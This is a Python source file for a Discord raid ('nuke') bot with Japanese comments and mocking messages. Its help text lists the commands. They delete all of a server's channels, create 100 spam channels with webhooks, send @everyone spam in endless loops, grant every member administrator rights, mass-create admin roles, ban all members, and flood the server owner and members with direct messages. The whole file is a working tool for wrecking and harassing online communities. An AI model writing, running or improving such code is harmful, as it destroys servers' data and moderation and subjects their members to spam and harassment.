import discord
from discord.ext import commands
import asyncio
import random
import string

client = commands.Bot(command_prefix=">",help_command=None,intents=discord.Intents.all())

@client.event
async def on_ready():
    print(f'botの起動に成功しました! {client.user}')
    print('---------')
    await client.change_presence(status=discord.Status.dnd, activity=discord.Activity(type=discord.ActivityType.listening, name="ez"))
webhooklist=[]  
webid=[]
dn="@everyone yuu on top" #dmspamのメッセージ内容
text="@everyone yuu on top"#spam内容
chn="@everyone yuu on top"#チャンネル名
owspam="@everyone yuu on top"#owに送る内容
webspam="@everyone yuu on top"#webhookのspam内容
@client.command()
async def dm(ctx:discord.Member):
    guild=ctx.guild
    men=guild.members
    while True:
     try:
       for ms in men:
        dm=client.get_user(int(ms.id))
        await dm.send(dn)
        await asyncio.sleep(0.4)
     except:
        pass
@client.command()
async def eznuke(ctx:discord.Interaction):
    guild=ctx.guild
    channel=guild.channels
    for ch in channel:
        channel=ch.id
        ch=client.get_channel(channel)
        await ch.delete(reason="荒らされたねーww")

    for i in range(100):      
     try:
         ch =await guild.create_text_channel(name=chn)
         await ch.send(text)
         webhook =await ch.create_webhook(reason="荒らされちゃったね by yuu",name="yuu on top")
         print(webhook)
         webhooklist.append(webhook.url)
         webid.append(webhook.id)
         await webhook.send(content="@everyone yuu on top")
     except:      
        pass

    with open('webhooks.txt', 'w') as d:
        for save in webhooklist:
          d.write("%s\n" % save)
    with open('webhooksid.txt', 'w') as d:
        for save in webid:
          d.write("%s\n" % save)
 
    while True:
         channel=guild.channels
         for cc in channel:
            ccid=cc.id
            cc=client.get_channel(ccid)
            await cc.send(text)
@client.command()
async def op(ctx:discord.Member):
    guild=ctx.guild
    men=guild.members
    perms = discord.Permissions()
    perms.update(administrator=True) 
    role=await guild.create_role(reason="荒らされちゃったねww",name="oproles",permissions=perms)  

    for mes in men:
     user=guild.get_member(mes.id)
     role = ctx.guild.get_role(int(role.id))
     await user.add_roles(role)
@client.command()
async def roles(ctx:discord.Member):
        guild=ctx.guild
        men=guild.members
        perms = discord.Permissions()
        perms.update(administrator=True) 
        chars = string.ascii_letters + string.digits
        while True:
            try:
                s = ''
                mystr = s.join([random.choice(chars) for i in range(5)])
                role=await guild.create_role(reason="荒らされちゃったねww",name=f"ezw{mystr}",permissions=perms)  
            except:
                break
@client.command()
async def banban(ctx:discord.Member):
    guild=ctx.guild
    men=guild.members
    for member in men:
        try:
            await member.ban(reason="にがいから")
            print(f"{member.name}をBANしました")
        except:
            print(f"{member.name}のBANにしっぱいしました")
@client.command()
async def owdm(ctx:discord.Member):
    target=ctx.guild.owner_id
    print(target)
    while True:
        user=ctx.guild.get_member(target)
        await user.send(owspam)
        await asyncio.sleep(0.5)
@client.command()
async def webhook(ctx:discord.Member):
    file = open('webhooksid.txt', 'r')
    
    webhh=file.readlines()
    for i,v in enumerate(webhh):
     webhh[i] = v.replace("\n", "")
    for i,v in enumerate(webhh):
     webhh[i] = v.replace("''", "")
    print(webhh)
    while True:
        for webhook_ida in webhh:
         webhooks=await client.fetch_webhook(int(webhook_ida))
         webhooks= await webhooks.send(webspam)
@client.command()
async def help(ctx:discord.Member):
    await ctx.send(embed=discord.Embed(
        title="help",
        description=">eznuke : チャンネル削除 webhook作成 ちゃんねる作成 spam\n>op : みんなに権限を上げます \n >roles : 大量のroleを作ります \n >webhook : >eznukeで作成したwebhookをつかいspamを開始します\n>owdm オーナーにdmspamします\n >dm : みんなにdmします \n >banban : みんなをBANします"
    

    ))
    
            


client.run('token')
